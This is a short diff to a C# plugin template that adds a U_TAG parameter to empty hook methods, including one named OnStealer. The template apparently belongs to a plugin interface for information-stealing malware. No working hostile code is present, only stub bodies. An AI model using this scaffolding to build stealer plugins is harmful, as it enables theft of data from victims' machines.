@@ -8,7 +8,7 @@ using System.Threading.Tasks;
 
 public class DPlugin
 {
-    public void OnLoad(string HOST, string TOKEN, string PATH)
+    public void OnLoad(string HOST, string TOKEN, string PATH, string U_TAG)
     {
         string PluginConfig = DCLIB.GetConfigFile("MyConfigFile.cfg");
 
@@ -21,19 +21,19 @@ public class DPlugin
     public static string CommandName = "MyTestCommand";
     
     //Delete this method, if you don't use commands.
-    public void OnCommand(string CommandParameter, string HOST, string TOKEN, string PATH)
+    public void OnCommand(string CommandParameter, string HOST, string TOKEN, string PATH, string U_TAG)
     {
         //YOUR CODE ON COMMAND EXECUTE
     }
     
     //Delete this method, if you don't provide actions after deleting build.
-    public void OnUninstall(string HOST, string TOKEN, string PATH)
+    public void OnUninstall(string HOST, string TOKEN, string PATH, string U_TAG)
     {
         //YOUR CODE ON BUILD UNINSTALL
     }
     
     //Delete this method, if you don't provide actions after execute stealer.
-    public List<object[]> OnStealer(string HOST, string TOKEN, string PATH)
+    public List<object[]> OnStealer(string HOST, string TOKEN, string PATH, string U_TAG)
     {
         List<object[]> Content = new List<object[]>();
         
